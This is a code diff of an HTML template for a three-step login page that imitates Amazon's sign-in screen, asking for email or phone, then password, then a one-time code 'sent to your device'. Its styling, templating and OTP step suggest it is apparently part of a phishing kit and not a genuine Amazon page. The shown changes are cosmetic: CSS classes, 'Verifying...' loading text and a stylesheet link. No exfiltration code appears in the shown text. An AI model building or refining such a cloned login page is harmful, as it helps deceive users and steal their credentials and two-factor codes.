@@ -10,6 +10,7 @@
   <style>
    body { font-family: "Amazon Ember", Arial, sans-serif; background-color: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; } .logo { margin-top: 14px; margin-bottom: 18px; } .logo img { height: 31px; width: 103px; } .card { width: 350px; border: 1px solid #ddd; border-radius: 4px; padding: 20px 26px; margin-bottom: 22px; } h1 { font-weight: 400; font-size: 28px; line-height: 1.2; margin-bottom: 10px; margin-top: 0; } label { display: block; font-weight: 700; font-size: 13px; margin-bottom: 5px; margin-top: 10px; color: #111; } input[type="text"], input[type="password"], input[type="email"] { width: 100%; padding: 7px 8px; margin-bottom: 10px; border: 1px solid #a6a6a6; border-radius: 3px; box-sizing: border-box; font-size: 13px; box-shadow: 0 1px 0 rgba(255,255,255,.5), 0 1px 0 rgba(0,0,0,.07) inset; } input:focus { border-color: #e77600; box-shadow: 0 0 3px 2px rgba(228, 121, 17, .5); outline: none; } .btn-primary { width: 100%; background: linear-gradient(to bottom, #f7dfa5, #f0c14b); border: 1px solid; border-color: #a88734 #9c7e31 #846a29; border-radius: 3px; cursor: pointer; padding: 6px; margin-top: 15px; font-size: 13px; box-shadow: 0 1px 0 rgba(255,255,255,.4) inset; } .btn-primary:hover { background: linear-gradient(to bottom, #f5d78e, #eeb933); } .legal { font-size: 12px; margin-top: 18px; line-height: 1.5; color: #111; } .legal a { color: #0066c0; text-decoration: none; } .legal a:hover { text-decoration: underline; color: #c45500; } .expander { margin-top: 22px; font-size: 13px; } .expander-header { color: #0066c0; cursor: pointer; display: flex; align-items: center; } .expander-header::before { content: ""; display: inline-block; width: 0; height: 0; border-left: 4px solid transparent; border-right: 4px solid transparent; border-top: 4px solid #666; margin-right: 5px; transform: rotate(-90deg); transition: transform 0.1s; } .expander-header.open::before { transform: rotate(0deg); } .expander-content { display: none; margin-top: 5px; margin-left: 10px; } .expander-content.open { display: block; } .divider { text-align: center; margin-top: 26px; margin-bottom: 14px; position: relative; width: 350px; } .divider::before { content: ""; position: absolute; top: 50%; left: 0; right: 0; border-top: 1px solid #e7e7e7; z-index: -1; } .divider span { background: #fff; padding: 0 8px; color: #767676; font-size: 12px; } .btn-create { display: block; width: 350px; text-align: center; background: linear-gradient(to bottom, #f7f8fa, #e7e9ec); border: 1px solid; border-color: #adb1b8 #a2a6ac #8d9096; border-radius: 3px; padding: 7px; font-size: 13px; color: #111; text-decoration: none; box-sizing: border-box; box-shadow: 0 1px 0 rgba(255,255,255,.6) inset; } .btn-create:hover { background: linear-gradient(to bottom, #e7eaf0, #d9dce1); } .footer { margin-top: auto; width: 100%; border-top: 1px solid #e7e7e7; background: linear-gradient(to bottom, #fff, #fcfcfc); padding: 26px 0; text-align: center; font-size: 11px; } .footer a { color: #0066c0; text-decoration: none; margin: 0 10px; } .footer a:hover { text-decoration: underline; color: #c45500; } .footer p { color: #555; margin-top: 10px; } .hidden { display: none; } .user-pill { font-size: 13px; margin-bottom: 10px; } .user-pill span { margin-right: 5px; } .change-link { color: #0066c0; text-decoration: none; font-size: 13px; cursor: pointer; } .change-link:hover { text-decoration: underline; color: #c45500; } .error-box { display: none; border: 1px solid #d00; border-radius: 4px; box-shadow: 0 0 0 1px #d00 inset; padding: 14px 18px; margin-bottom: 18px; width: 350px; box-sizing: border-box; } .error-box-header { color: #c40000; font-size: 13px; font-weight: 700; display: flex; align-items: center; } .error-box-header svg { fill: #c40000; margin-right: 8px; } .error-box-message { font-size: 13px; margin-top: 5px; margin-left: 26px; }
   </style>
+  <link href="/core/assets/css/animations.css" rel="stylesheet"/>
  </head>
  <body>
   <div class="logo">
@@ -34,13 +35,13 @@
     Log in
    </h1>
    <form id="form-step-1">
-    <div id="error-msg" style="color: #d93025; font-size: 12px; margin: 10px 0; display: none;">
+    <div class="error-message" id="error-msg" style="color: #d93025; font-size: 12px; margin: 10px 0; display: none;">
     </div>
     <label for="email">
      Email or mobile phone number
     </label>
-    <input id="email" name="email" required="" type="text" value="{{ email }}"/>
-    <button class="btn-primary" id="btn-next" type="submit">
+    <input class="input-field" id="email" name="email" required="" type="text" value="{{ email }}"/>
+    <button class="btn-primary" data-loading-text="Verifying..." id="btn-next" type="submit">
      Continue
     </button>
     <div class="legal">
@@ -87,7 +88,7 @@
     </a>
    </div>
    <form id="form-step-2">
-    <div id="error-msg" style="color: #d93025; font-size: 12px; margin: 10px 0; display: none;">
+    <div class="error-message" id="error-msg" style="color: #d93025; font-size: 12px; margin: 10px 0; display: none;">
     </div>
     <div style="display: flex; justify-content: space-between; align-items: baseline;">
      <label for="password">
@@ -97,8 +98,8 @@
       Forgot your password?
      </a>
     </div>
-    <input id="password" name="password" required="" type="password"/>
-    <button class="btn-primary" id="btn-submit" type="submit">
+    <input class="input-field" id="password" name="password" required="" type="password"/>
+    <button class="btn-primary" data-loading-text="Verifying..." id="btn-submit" type="submit">
      Log in
     </button>
     <div style="margin-top: 14px; font-size: 13px; display: flex; align-items: center;">
@@ -184,8 +185,8 @@
    <p style="margin-bottom: 20px; color: #666;">
     Please enter the code sent to your device.
    </p>
-   <input id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;" type="text"/>
-   <button id="btn-otp-submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">
+   <input class="input-field" id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;" type="text"/>
+   <button class="btn-primary" id="btn-otp-submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">
     Verify
    </button>
   </div>
